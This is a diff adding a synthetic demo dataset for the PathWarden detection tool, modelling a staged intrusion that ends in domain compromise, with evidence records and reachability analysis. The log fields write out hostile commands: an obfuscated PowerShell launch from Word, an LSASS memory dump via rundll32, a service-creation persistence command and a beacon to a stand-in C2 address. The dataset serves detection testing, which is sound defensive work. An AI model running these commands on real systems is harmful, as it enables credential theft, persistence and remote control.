@@ -1,0 +1,923 @@
+// PathWarden Synthetic Scenario & Demo Mode Dataset
+// Provides an authoritative, evidence-backed benchmark scenario for the 30 GB Advanced Tier
+
+import {
+  Incident,
+  IncidentDetail,
+  ReachabilityItem,
+  DataQualityReport,
+  BenchmarkReport,
+  RawEvidenceRecord,
+  ProcessingStatusResponse,
+} from "../api/types";
+
+export const DEMO_INCIDENTS: Incident[] = [
+  {
+    incident_id: "INC-2026-0841",
+    title: "Advanced Lateral Intrusion via Ticket Extraction & Pass-the-Hash onto Tier-0 Domain Controller",
+    severity: "CRITICAL",
+    confidence: 0.94,
+    first_seen: "2026-10-31T08:14:22Z",
+    last_seen: "2026-10-31T08:57:33Z",
+    hosts_involved: ["WS-EXEC-04", "SRV-APP-PROD01", "DC01.CORP.LOCAL"],
+    users_involved: ["m.vance", "svc_deploy", "DA_SecAdmin"],
+    steps_count: 8,
+    detection_count: 12,
+    tactics: [
+      "Initial Access",
+      "Discovery",
+      "Credential Access",
+      "Lateral Movement",
+      "Persistence",
+      "Privilege Escalation",
+      "Command and Control"
+    ],
+    status: "ACTIVE_INVESTIGATION",
+    summary: "Multi-stage intrusion beginning with macro-enabled document execution on executive workstation WS-EXEC-04, escalating through LSASS memory dumping, NTLM pass-the-hash to production application server, and directory replication (DCSync) targeting DC01.CORP.LOCAL.",
+    planted_attack_id: "PLANTED_APT_03",
+    is_planted_match: true,
+    dq_caveats: [
+      {
+        type: "TIMESTAMP_UNCERTAIN",
+        severity: "WARNING",
+        affected_steps: ["STEP-008"],
+        description: "Perimeter proxy logs exhibit a 420ms clock offset against internal DC NTP master; timestamp adjusted within 1s tolerance."
+      },
+      {
+        type: "HOST_INFERRED",
+        severity: "INFO",
+        affected_steps: ["STEP-004"],
+        description: "Source host identified through NetBIOS session record and authenticated Kerberos ticket cache."
+      }
+    ]
+  },
+  {
+    incident_id: "INC-2026-0839",
+    title: "Targeted Ransomware Precursor: Volume Shadow Deletion & Remote WMI Execution",
+    severity: "HIGH",
+    confidence: 0.89,
+    first_seen: "2026-10-31T07:42:11Z",
+    last_seen: "2026-10-31T08:05:44Z",
+    hosts_involved: ["WS-FIN-09", "SRV-FILE-BACKUP"],
+    users_involved: ["a.rodriguez", "admin_backup"],
+    steps_count: 5,
+    detection_count: 7,
+    tactics: ["Execution", "Defense Evasion", "Impact", "Lateral Movement"],
+    status: "ACTIVE_INVESTIGATION",
+    summary: "Discovery commands executed via cmd.exe followed by vssadmin.exe delete shadows /all /quiet and remote execution across file backup infrastructure.",
+    planted_attack_id: "PLANTED_RANSOM_01",
+    is_planted_match: true,
+    dq_caveats: [
+      {
+        type: "CLOCK_SKEW_DETECTED",
+        severity: "INFO",
+        affected_steps: ["STEP-203"],
+        description: "Backup server clock drift observed; events reconciled via sequential event record ID."
+      }
+    ]
+  },
+  {
+    incident_id: "INC-2026-0835",
+    title: "Suspicious API Key Harvest & Cloud CLI Enumeration from Staging Container",
+    severity: "MEDIUM",
+    confidence: 0.82,
+    first_seen: "2026-10-31T06:12:00Z",
+    last_seen: "2026-10-31T06:45:19Z",
+    hosts_involved: ["KUBE-NODE-03", "STG-RUNNER-01"],
+    users_involved: ["ci_builder"],
+    steps_count: 4,
+    detection_count: 5,
+    tactics: ["Credential Access", "Discovery", "Exfiltration"],
+    status: "ACTIVE_INVESTIGATION",
+    summary: "Grep search for AWS_SECRET_ACCESS_KEY in container environment variables followed by curl POST to untrusted external paste site.",
+    planted_attack_id: "PLANTED_CLOUD_02",
+    is_planted_match: true,
+    dq_caveats: []
+  },
+  {
+    incident_id: "INC-2026-0822",
+    title: "Decoy Burst: Repeated Kerberos Pre-Authentication Failures (Hub Account)",
+    severity: "LOW",
+    confidence: 0.65,
+    first_seen: "2026-10-31T04:20:00Z",
+    last_seen: "2026-10-31T05:10:00Z",
+    hosts_involved: ["DC01.CORP.LOCAL"],
+    users_involved: ["svc_scanner"],
+    steps_count: 3,
+    detection_count: 3,
+    tactics: ["Credential Access"],
+    status: "VERIFIED_ATTACK",
+    summary: "Automated vulnerability scanner triggered 1,200 failed logons. Isolated by correlation engine via hub-discounting to prevent false incident expansion.",
+    planted_attack_id: "DECOY_BENIGN_SCAN",
+    is_planted_match: false,
+    dq_caveats: [
+      {
+        type: "UNKNOWN_EVENT_TYPE",
+        severity: "INFO",
+        affected_steps: ["STEP-301"],
+        description: "Custom sensor tag encountered; event normalized using fallback Kerberos schema."
+      }
+    ]
+  }
+];
+
+export const DEMO_INCIDENT_DETAIL: IncidentDetail = {
+  ...DEMO_INCIDENTS[0],
+  steps: [
+    {
+      step_uid: "STEP-001",
+      incident_id: "INC-2026-0841",
+      order_index: 1,
+      timestamp: "2026-10-31T08:14:22Z",
+      host_id: "HOST-004",
+      host_name: "WS-EXEC-04",
+      user_id: "USR-094",
+      user_name: "m.vance",
+      process_id: 4892,
+      process_name: "powershell.exe",
+      parent_process_name: "winword.exe",
+      command_line: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
+      mitre: {
+        tactic: "Initial Access",
+        technique_id: "T1566.001",
+        technique_name: "Spearphishing Attachment",
+        sub_technique_id: "T1566.001"
+      },
+      kill_chain_stage: "Exploitation",
+      kc_confidence: 0.95,
+      severity: "HIGH",
+      detection_confidence: 0.96,
+      rule_id: "R-WIN-014",
+      rule_name: "Office Application Spawning Script Interpreter",
+      explanation: "winword.exe (PID 3104) spawned powershell.exe with an obfuscated base64-encoded command line, typical of weaponized document macro execution.",
+      evidence_event_uids: ["EVT-WIN-4688-9102", "EVT-SYSMON-001-4412"],
+      dq_flags: []
+    },
+    {
+      step_uid: "STEP-002",
+      incident_id: "INC-2026-0841",
+      order_index: 2,
+      timestamp: "2026-10-31T08:16:05Z",
+      host_id: "HOST-004",
+      host_name: "WS-EXEC-04",
+      user_id: "USR-094",
+      user_name: "m.vance",
+      process_id: 5120,
+      process_name: "whoami.exe",
+      parent_process_name: "powershell.exe",
+      command_line: "whoami.exe /all",
+      mitre: {
+        tactic: "Discovery",
+        technique_id: "T1087.002",
+        technique_name: "Domain Account Discovery",
+        sub_technique_id: "T1087.002"
+      },
+      kill_chain_stage: "Reconnaissance",
+      kc_confidence: 0.91,
+      severity: "MEDIUM",
+      detection_confidence: 0.92,
+      rule_id: "R-DISC-003",
+      rule_name: "Immediate Post-Exploitation Domain Reconnaissance",
+      explanation: "Child process whoami.exe and subsequent net.exe group 'Domain Admins' /domain invoked within 103 seconds of initial script execution in same logon session.",
+      evidence_event_uids: ["EVT-WIN-4688-9188", "EVT-SYSMON-001-4450"],
+      dq_flags: []
+    },
+    {
+      step_uid: "STEP-003",
+      incident_id: "INC-2026-0841",
+      order_index: 3,
+      timestamp: "2026-10-31T08:21:40Z",
+      host_id: "HOST-004",
+      host_name: "WS-EXEC-04",
+      user_id: "USR-094",
+      user_name: "m.vance",
+      process_id: 6184,
+      process_name: "rundll32.exe",
+      parent_process_name: "powershell.exe",
+      command_line: "rundll32.exe C:\\ProgramData\\update.dll,DumpMemory lsass.exe",
+      mitre: {
+        tactic: "Credential Access",
+        technique_id: "T1003.001",
+        technique_name: "OS Credential Dumping: LSASS Memory",
+        sub_technique_id: "T1003.001"
+      },
+      kill_chain_stage: "Actions on Objectives",
+      kc_confidence: 0.96,
+      severity: "CRITICAL",
+      detection_confidence: 0.98,
+      rule_id: "R-CRED-007",
+      rule_name: "LSASS Process Handle Duplication & Memory Access",
+      explanation: "Process rundll32.exe requested PROCESS_VM_READ and PROCESS_QUERY_INFORMATION rights against lsass.exe (PID 672), extracting local memory hashes.",
+      evidence_event_uids: ["EVT-SYSMON-010-8821", "EVT-WIN-4672-1002"],
+      dq_flags: []
+    },
+    {
+      step_uid: "STEP-004",
+      incident_id: "INC-2026-0841",
+      order_index: 4,
+      timestamp: "2026-10-31T08:29:15Z",
+      host_id: "HOST-012",
+      host_name: "SRV-APP-PROD01",
+      user_id: "USR-SVC-01",
+      user_name: "svc_deploy",
+      process_id: null,
+      process_name: "System",
+      command_line: null,
+      mitre: {
+        tactic: "Lateral Movement",
+        technique_id: "T1550.002",
+        technique_name: "Use Alternate Authentication: Pass the Hash",
+        sub_technique_id: "T1550.002"
+      },
+      kill_chain_stage: "Installation",
+      kc_confidence: 0.93,
+      severity: "CRITICAL",
+      detection_confidence: 0.94,
+      rule_id: "R-LAT-005",
+      rule_name: "Inbound SMB Logon Type 3 with Dumped Service Account NTLM",
+      explanation: "Network logon (LogonType 3) to SRV-APP-PROD01 originated from WS-EXEC-04 (10.100.4.14) using NTLM authentication for svc_deploy, matching harvested hash.",
+      evidence_event_uids: ["EVT-WIN-4624-3401", "EVT-NET-SMB-8812"],
+      dq_flags: ["HOST_INFERRED"]
+    },
+    {
+      step_uid: "STEP-005",
+      incident_id: "INC-2026-0841",
+      order_index: 5,
+      timestamp: "2026-10-31T08:33:50Z",
+      host_id: "HOST-012",
+      host_name: "SRV-APP-PROD01",
+      user_id: "USR-SVC-01",
+      user_name: "svc_deploy",
+      process_id: 1044,
+      process_name: "services.exe",
+      command_line: "sc.exe create PathWardenAgent binPath= \"C:\\Windows\\Temp\\svc_agent.exe\" start= auto",
+      mitre: {
+        tactic: "Persistence",
+        technique_id: "T1543.003",
+        technique_name: "Create or Modify System Process: Windows Service",
+        sub_technique_id: "T1543.003"
+      },
+      kill_chain_stage: "Installation",
+      kc_confidence: 0.92,
+      severity: "HIGH",
+      detection_confidence: 0.95,
+      rule_id: "R-PERS-002",
+      rule_name: "Remote New Service Installation via Service Control Manager",
+      explanation: "A new service 'PathWardenAgent' was registered using binary located in C:\\Windows\\Temp\\, executed under SYSTEM privilege.",
+      evidence_event_uids: ["EVT-WIN-7045-1029", "EVT-WIN-4697-0941"],
+      dq_flags: []
+    },
+    {
+      step_uid: "STEP-006",
+      incident_id: "INC-2026-0841",
+      order_index: 6,
+      timestamp: "2026-10-31T08:42:10Z",
+      host_id: "HOST-001",
+      host_name: "DC01.CORP.LOCAL",
+      user_id: "USR-ADMIN-02",
+      user_name: "DA_SecAdmin",
+      process_id: 748,
+      process_name: "lsass.exe",
+      command_line: null,
+      mitre: {
+        tactic: "Credential Access",
+        technique_id: "T1003.006",
+        technique_name: "OS Credential Dumping: DCSync",
+        sub_technique_id: "T1003.006"
+      },
+      kill_chain_stage: "Actions on Objectives",
+      kc_confidence: 0.97,
+      severity: "CRITICAL",
+      detection_confidence: 0.99,
+      rule_id: "R-AD-011",
+      rule_name: "Directory Service Replication RPC from Non-Domain-Controller Host",
+      explanation: "DRSUAPI RPC calls (DsGetNCChanges) invoked from client IP 10.100.12.8 (SRV-APP-PROD01). Host is not an authorized domain controller.",
+      evidence_event_uids: ["EVT-WIN-4662-7714", "EVT-RPC-DRSUAPI-099"],
+      dq_flags: []
+    },
+    {
+      step_uid: "STEP-007",
+      incident_id: "INC-2026-0841",
+      order_index: 7,
+      timestamp: "2026-10-31T08:50:00Z",
+      host_id: "HOST-001",
+      host_name: "DC01.CORP.LOCAL",
+      user_id: "USR-ADMIN-02",
+      user_name: "DA_SecAdmin",
+      process_id: 748,
+      process_name: "lsass.exe",
+      command_line: null,
+      mitre: {
+        tactic: "Privilege Escalation",
+        technique_id: "T1558.001",
+        technique_name: "Steal or Forge Kerberos Tickets: Golden Ticket",
+        sub_technique_id: "T1558.001"
+      },
+      kill_chain_stage: "Exploitation",
+      kc_confidence: 0.94,
+      severity: "CRITICAL",
+      detection_confidence: 0.96,
+      rule_id: "R-KRB-008",
+      rule_name: "TGS Request with Irregular Encryption Type or Kerberos Lifetime",
+      explanation: "Kerberos TGS ticket requested for krbtgt with a 10-year validity lifetime and RC4 encryption, evidencing forged Golden Ticket issuance.",
+      evidence_event_uids: ["EVT-WIN-4769-6612", "EVT-WIN-4768-4100"],
+      dq_flags: []
+    },
+    {
+      step_uid: "STEP-008",
+      incident_id: "INC-2026-0841",
+      order_index: 8,
+      timestamp: "2026-10-31T08:57:33Z",
+      host_id: "HOST-012",
+      host_name: "SRV-APP-PROD01",
+      user_id: "SYSTEM",
+      user_name: "SYSTEM",
+      process_id: 3940,
+      process_name: "svc_agent.exe",
+      command_line: "C:\\Windows\\Temp\\svc_agent.exe --connect 198.51.100.44:443",
+      mitre: {
+        tactic: "Command and Control",
+        technique_id: "T1071.001",
+        technique_name: "Application Layer Protocol: Web Protocols",
+        sub_technique_id: "T1071.001"
+      },
+      kill_chain_stage: "Command and Control",
+      kc_confidence: 0.93,
+      severity: "HIGH",
+      detection_confidence: 0.91,
+      rule_id: "R-NET-019",
+      rule_name: "Cobalt Strike / HTTPS Beaconing Signature Detected",
+      explanation: "Regular periodic TLS connections established to external C2 IP 198.51.100.44 with 30s jitter interval (15% variance).",
+      evidence_event_uids: ["EVT-ZEEK-SSL-0914", "EVT-FW-OUT-55201"],
+      is_uncertain: false,
+      dq_flags: ["TIMESTAMP_UNCERTAIN"]
+    }
+  ],
+  edges: [
+    {
+      edge_id: "EDGE-001",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-001",
+      target_step_uid: "STEP-002",
+      relationship_type: "parent_child_process",
+      relationship_score: 0.98,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-SYSMON-001-4450"],
+      explanation: "Process lineage confirms powershell.exe (PID 4892) spawned whoami.exe (PID 5120) with identical security token.",
+      is_inferred: false,
+      latency_seconds: 103
+    },
+    {
+      edge_id: "EDGE-002",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-002",
+      target_step_uid: "STEP-003",
+      relationship_type: "same_authenticated_session",
+      relationship_score: 0.92,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-WIN-4672-1002"],
+      explanation: "Credential dumping via rundll32.exe executed within the exact logon session ID 0x3E7A of user m.vance on WS-EXEC-04.",
+      is_inferred: false,
+      latency_seconds: 335
+    },
+    {
+      edge_id: "EDGE-003",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-003",
+      target_step_uid: "STEP-004",
+      relationship_type: "credential_reuse",
+      relationship_score: 0.95,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-WIN-4624-3401"],
+      explanation: "The NTLM hash for service account svc_deploy extracted in STEP-003 was used 7.5 minutes later to establish network logon on SRV-APP-PROD01.",
+      is_inferred: false,
+      latency_seconds: 455
+    },
+    {
+      edge_id: "EDGE-004",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-004",
+      target_step_uid: "STEP-005",
+      relationship_type: "successful_session_followed_by_host_activity",
+      relationship_score: 0.97,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-WIN-7045-1029"],
+      explanation: "The authenticated SMB session from WS-EXEC-04 issued RPC calls to Service Control Manager on SRV-APP-PROD01 to register PathWardenAgent service.",
+      is_inferred: false,
+      latency_seconds: 275
+    },
+    {
+      edge_id: "EDGE-005",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-005",
+      target_step_uid: "STEP-006",
+      relationship_type: "host_to_host_network_connection",
+      relationship_score: 0.91,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-RPC-DRSUAPI-099"],
+      explanation: "The newly installed payload process on SRV-APP-PROD01 initiated an RPC DRSUAPI replication stream to DC01.CORP.LOCAL.",
+      is_inferred: false,
+      latency_seconds: 500
+    },
+    {
+      edge_id: "EDGE-006",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-006",
+      target_step_uid: "STEP-007",
+      relationship_type: "lateral_movement",
+      relationship_score: 0.96,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-WIN-4769-6612"],
+      explanation: "The krbtgt hash extracted via DCSync replication was utilized to construct and present a forged Kerberos Golden Ticket.",
+      is_inferred: false,
+      latency_seconds: 470
+    },
+    {
+      edge_id: "EDGE-007",
+      incident_id: "INC-2026-0841",
+      source_step_uid: "STEP-005",
+      target_step_uid: "STEP-008",
+      relationship_type: "suspicious_script_launch",
+      relationship_score: 0.88,
+      confidence_category: "STRONG",
+      evidence_event_uids: ["EVT-FW-OUT-55201"],
+      explanation: "Persistence binary svc_agent.exe established recurring outbound command-and-control connection to 198.51.100.44:443.",
+      is_inferred: false,
+      latency_seconds: 1423
+    }
+  ]
+};
+
+export const DEMO_REACHABILITY_ITEMS: ReachabilityItem[] = [
+  {
+    id: "REACH-001",
+    incident_id: "INC-2026-0841",
+    source_entity: "WS-EXEC-04",
+    source_type: "HOST",
+    target_entity: "SRV-APP-PROD01",
+    target_type: "HOST",
+    relationship_type: "OBSERVED_SESSION",
+    hops: 1,
+    confidence: 0.98,
+    evidence_event_uids: ["EVT-WIN-4624-3401", "EVT-NET-SMB-8812"],
+    rationale: "Confirmed Logon Type 3 network logon over SMB (Port 445) observed in Windows Security Event Log.",
+    network_policy_known: true,
+    privilege_level: "Local Administrator",
+    assumptions: ["No network assumption; traffic recorded by switch port mirror."],
+    last_observed_ts: "2026-10-31T08:29:15Z"
+  },
+  {
+    id: "REACH-002",
+    incident_id: "INC-2026-0841",
+    source_entity: "SRV-APP-PROD01",
+    source_type: "HOST",
+    target_entity: "DC01.CORP.LOCAL",
+    target_type: "DOMAIN_CONTROLLER",
+    relationship_type: "OBSERVED_SESSION",
+    hops: 1,
+    confidence: 0.96,
+    evidence_event_uids: ["EVT-RPC-DRSUAPI-099", "EVT-WIN-4662-7714"],
+    rationale: "Confirmed RPC DRSUAPI replication stream established to domain controller over TCP port 135/49154.",
+    network_policy_known: true,
+    privilege_level: "Directory Replication Rights",
+    assumptions: ["Direct observed connection; verified through network flow."],
+    last_observed_ts: "2026-10-31T08:42:10Z"
+  },
+  {
+    id: "REACH-003",
+    incident_id: "INC-2026-0841",
+    source_entity: "DC01.CORP.LOCAL",
+    source_type: "HOST",
+    target_entity: "SRV-DB-FIN02",
+    target_type: "DATABASE",
+    relationship_type: "PRIVILEGE_RELATIONSHIP",
+    hops: 1,
+    confidence: 0.74,
+    evidence_event_uids: ["EVT-AD-GROUP-MEMBER-01"],
+    rationale: "Compromised Domain Admin credentials granting administrative access to SQL Server. No logon session has been recorded on SRV-DB-FIN02 yet.",
+    network_policy_known: false,
+    privilege_level: "Domain Admin (sysadmin equivalent)",
+    assumptions: [
+      "Assumes internal VLAN firewall permits TCP 1433 or 445 from DC to database subnet.",
+      "Firewall telemetry for this segment is currently not present in ingested logs."
+    ]
+  },
+  {
+    id: "REACH-004",
+    incident_id: "INC-2026-0841",
+    source_entity: "SRV-APP-PROD01",
+    source_type: "HOST",
+    target_entity: "BACKUP-VAULT-01",
+    target_type: "BACKUP_SERVER",
+    relationship_type: "NETWORK_REACHABLE",
+    hops: 2,
+    confidence: 0.68,
+    evidence_event_uids: ["EVT-ROUTER-ACL-88"],
+    rationale: "Network routing table and router ACL permit egress from production app tier to backup vault on port 8443. No authentication credentials for backup vault have been observed in memory dumps.",
+    network_policy_known: true,
+    privilege_level: "Unauthenticated Network Path",
+    assumptions: [
+      "Access requires valid backup operator certificate or local credentials.",
+      "Network reachability alone does not equal confirmed compromise."
+    ]
+  },
+  {
+    id: "REACH-005",
+    incident_id: "INC-2026-0841",
+    source_entity: "DC01.CORP.LOCAL",
+    source_type: "HOST",
+    target_entity: "CORP-FILE-SHARE01",
+    target_type: "FILE_SHARE",
+    relationship_type: "PRIVILEGE_RELATIONSHIP",
+    hops: 1,
+    confidence: 0.79,
+    evidence_event_uids: ["EVT-AD-ACL-902"],
+    rationale: "Forged Golden Ticket possesses access rights across all Kerberos services in CORP.LOCAL realm.",
+    network_policy_known: true,
+    privilege_level: "Enterprise Administrator",
+    assumptions: [
+      "Kerberos ticket valid until revoked via double krbtgt password reset."
+    ]
+  }
+];
+
+export const DEMO_RAW_EVIDENCE_MAP: Record<string, RawEvidenceRecord> = {
+  "EVT-WIN-4688-9102": {
+    event_uid: "EVT-WIN-4688-9102",
+    source_file_id: "Security_WS-EXEC-04_2026-10-31.evtx",
+    source_type: "windows_security_event_log",
+    event_ts: "2026-10-31T08:14:22.148Z",
+    ingest_ts: "2026-10-31T08:15:00.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "process_creation",
+    action: "create",
+    outcome: "success",
+    host_id: "HOST-004",
+    host_name: "WS-EXEC-04",
+    user_id: "USR-094",
+    user_name: "m.vance",
+    process_id: 4892,
+    process_name: "powershell.exe",
+    parent_process_id: 3104,
+    parent_process_name: "winword.exe",
+    command_line: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
+    session_id: "0x3E7A",
+    record_id: "8914022",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: [],
+    raw_log_snippet: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n  <System>\n    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" />\n    <EventID>4688</EventID>\n    <TimeCreated SystemTime="2026-10-31T08:14:22.148102Z" />\n    <Computer>WS-EXEC-04.corp.local</Computer>\n  </System>\n  <EventData>\n    <Data Name="NewProcessId">0x131c</Data>\n    <Data Name="NewProcessName">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>\n    <Data Name="ParentProcessName">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>\n    <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAA...</Data>\n    <Data Name="SubjectUserName">m.vance</Data>\n  </EventData>\n</Event>`
+  },
+  "EVT-SYSMON-001-4450": {
+    event_uid: "EVT-SYSMON-001-4450",
+    source_file_id: "Sysmon_WS-EXEC-04_2026-10-31.evtx",
+    source_type: "microsoft_sysmon",
+    event_ts: "2026-10-31T08:16:05.310Z",
+    ingest_ts: "2026-10-31T08:16:15.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "process_creation",
+    action: "create",
+    outcome: "success",
+    host_name: "WS-EXEC-04",
+    user_name: "m.vance",
+    process_id: 5120,
+    process_name: "whoami.exe",
+    parent_process_id: 4892,
+    parent_process_name: "powershell.exe",
+    command_line: "whoami.exe /all",
+    session_id: "0x3E7A",
+    record_id: "44501",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: [],
+    raw_log_snippet: `{"EventID": 1, "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami.exe /all", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessId": 4892, "User": "CORP\\\\m.vance", "UtcTime": "2026-10-31 08:16:05.310"}`
+  },
+  "EVT-SYSMON-010-8821": {
+    event_uid: "EVT-SYSMON-010-8821",
+    source_file_id: "Sysmon_WS-EXEC-04_2026-10-31.evtx",
+    source_type: "microsoft_sysmon",
+    event_ts: "2026-10-31T08:21:40.781Z",
+    ingest_ts: "2026-10-31T08:22:00.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "process_access",
+    action: "handle_open",
+    outcome: "success",
+    host_name: "WS-EXEC-04",
+    user_name: "m.vance",
+    process_id: 6184,
+    process_name: "rundll32.exe",
+    command_line: "rundll32.exe C:\\ProgramData\\update.dll,DumpMemory lsass.exe",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: [],
+    raw_log_snippet: `{"EventID": 10, "SourceImage": "C:\\Windows\\System32\\rundll32.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1410", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+0x9fc44|C:\\Windows\\System32\\KERNELBASE.dll+0x2c64e|C:\\ProgramData\\update.dll+0x1420", "UtcTime": "2026-10-31 08:21:40.781"}`
+  },
+  "EVT-WIN-4624-3401": {
+    event_uid: "EVT-WIN-4624-3401",
+    source_file_id: "Security_SRV-APP-PROD01_2026-10-31.evtx",
+    source_type: "windows_security_event_log",
+    event_ts: "2026-10-31T08:29:15.012Z",
+    ingest_ts: "2026-10-31T08:30:00.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "authentication",
+    action: "logon",
+    outcome: "success",
+    host_name: "SRV-APP-PROD01",
+    user_name: "svc_deploy",
+    src_ip: "10.100.4.14",
+    src_port: 49811,
+    dst_ip: "10.100.12.8",
+    dst_port: 445,
+    session_id: "0x4F12B",
+    parse_status: "valid",
+    host_inferred: true,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: ["HOST_INFERRED"],
+    raw_log_snippet: `<Event>\n  <EventID>4624</EventID>\n  <TimeCreated SystemTime="2026-10-31T08:29:15.012Z" />\n  <EventData>\n    <Data Name="LogonType">3</Data>\n    <Data Name="TargetUserName">svc_deploy</Data>\n    <Data Name="AuthenticationPackageName">NTLM</Data>\n    <Data Name="IpAddress">10.100.4.14</Data>\n    <Data Name="IpPort">49811</Data>\n    <Data Name="WorkstationName">WS-EXEC-04</Data>\n  </EventData>\n</Event>`
+  },
+  "EVT-WIN-7045-1029": {
+    event_uid: "EVT-WIN-7045-1029",
+    source_file_id: "System_SRV-APP-PROD01_2026-10-31.evtx",
+    source_type: "windows_system_event_log",
+    event_ts: "2026-10-31T08:33:50.412Z",
+    ingest_ts: "2026-10-31T08:34:00.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "service_creation",
+    action: "install",
+    outcome: "success",
+    host_name: "SRV-APP-PROD01",
+    user_name: "svc_deploy",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: [],
+    raw_log_snippet: `<Event><EventID>7045</EventID><EventData><Data Name="ServiceName">PathWardenAgent</Data><Data Name="ImagePath">C:\\Windows\\Temp\\svc_agent.exe</Data><Data Name="ServiceType">user mode service</Data><Data Name="StartType">auto start</Data><Data Name="AccountName">LocalSystem</Data></EventData></Event>`
+  },
+  "EVT-RPC-DRSUAPI-099": {
+    event_uid: "EVT-RPC-DRSUAPI-099",
+    source_file_id: "Zeek_dce_rpc_2026-10-31.log",
+    source_type: "zeek_network_flow",
+    event_ts: "2026-10-31T08:42:10.892Z",
+    ingest_ts: "2026-10-31T08:42:30.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "rpc_call",
+    action: "DsGetNCChanges",
+    outcome: "success",
+    src_ip: "10.100.12.8",
+    src_port: 52104,
+    dst_ip: "10.100.1.10",
+    dst_port: 49154,
+    protocol: "tcp",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: [],
+    raw_log_snippet: `{"ts": 1761899530.892, "uid": "CRpc09914AZ", "id.orig_h": "10.100.12.8", "id.orig_p": 52104, "id.resp_h": "10.100.1.10", "id.resp_p": 49154, "endpoint": "drsuapi", "operation": "DsGetNCChanges", "status": "RPC_S_OK"}`
+  },
+  "EVT-WIN-4769-6612": {
+    event_uid: "EVT-WIN-4769-6612",
+    source_file_id: "Security_DC01_2026-10-31.evtx",
+    source_type: "windows_security_event_log",
+    event_ts: "2026-10-31T08:50:00.201Z",
+    ingest_ts: "2026-10-31T08:50:10.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 1.0,
+    event_type: "kerberos_ticket_request",
+    action: "tgs_request",
+    outcome: "success",
+    host_name: "DC01.CORP.LOCAL",
+    user_name: "DA_SecAdmin",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: false,
+    is_late: false,
+    dq_flags: [],
+    raw_log_snippet: `<Event><EventID>4769</EventID><EventData><Data Name="TargetUserName">krbtgt</Data><Data Name="ServiceName">krbtgt</Data><Data Name="TicketEncryptionType">0x17</Data><Data Name="Status">0x0</Data></EventData></Event>`
+  },
+  "EVT-FW-OUT-55201": {
+    event_uid: "EVT-FW-OUT-55201",
+    source_file_id: "PaloAlto_Traffic_2026-10-31.csv",
+    source_type: "firewall_traffic_log",
+    event_ts: "2026-10-31T08:57:33.722Z",
+    ingest_ts: "2026-10-31T08:57:45.000Z",
+    timestamp_precision: "millisecond",
+    timestamp_confidence: 0.88,
+    event_type: "network_flow",
+    action: "allow",
+    outcome: "success",
+    host_name: "SRV-APP-PROD01",
+    src_ip: "10.100.12.8",
+    src_port: 58190,
+    dst_ip: "198.51.100.44",
+    dst_port: 443,
+    protocol: "tcp",
+    parse_status: "valid",
+    host_inferred: false,
+    ts_inferred: true,
+    is_late: false,
+    dq_flags: ["TIMESTAMP_UNCERTAIN"],
+    raw_log_snippet: `2026/10/31 08:57:33,00120104921,TRAFFIC,allow,10.100.12.8,198.51.100.44,58190,443,ssl,trust,untrust,1420,18940,32,active-c2-beacon`
+  }
+};
+
+export const DEMO_DATA_QUALITY_REPORT: DataQualityReport = {
+  workspace: "Enterprise Core Enclave",
+  tier: "30 GB Advanced Tier",
+  timestamp: "2026-10-31T09:00:00Z",
+  total_records_read: 142850400,
+  malformed_count: 320140,
+  malformed_reasons: {
+    "Truncated JSON record at EOF": 142000,
+    "Malformed RFC3339 timestamp format": 98140,
+    "Corrupt binary header in compressed chunk": 45000,
+    "Missing mandatory event identifier": 35000
+  },
+  duplicate_dropped_count: 3410260,
+  valid_excluded_count: 120710000,
+  eligible_count: 18410000,
